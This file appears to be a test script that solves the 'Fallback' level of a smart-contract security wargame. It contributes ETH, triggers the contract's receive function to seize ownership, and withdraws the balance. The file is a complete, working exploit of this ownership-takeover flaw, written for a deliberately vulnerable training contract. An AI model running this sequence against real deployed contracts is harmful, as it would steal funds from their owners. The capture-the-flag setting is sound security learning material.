import { expect } from "chai";
import { Contract, Signer, utils } from "ethers";
import { setupTest } from "./utils";

let eoa: Signer;
let challenge: Contract; // challenge contract

// Setup challenge level instance, eoa, attacker and before/after hooks
const contractLevel = "0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB";
const contractName = "Fallback";
({ eoa, challenge } = await setupTest(contractLevel, { contractName }));

it("solves the challenge", async () => {
  const value = utils.parseEther("0.0001");
  // send to payable contribute
  await challenge.contribute({ value });
  // check contribution is greater than 0
  const contribution = await challenge.getContribution();
  expect(contribution).is.equal(value);
  // send some ETH to contract via the receive fallback function to claim the contract
  await eoa.sendTransaction({ to: challenge.address, value });
  expect(await challenge.owner()).to.equal(await eoa.getAddress());
  // withdraw balance once we are the owner
  await challenge.withdraw();
});
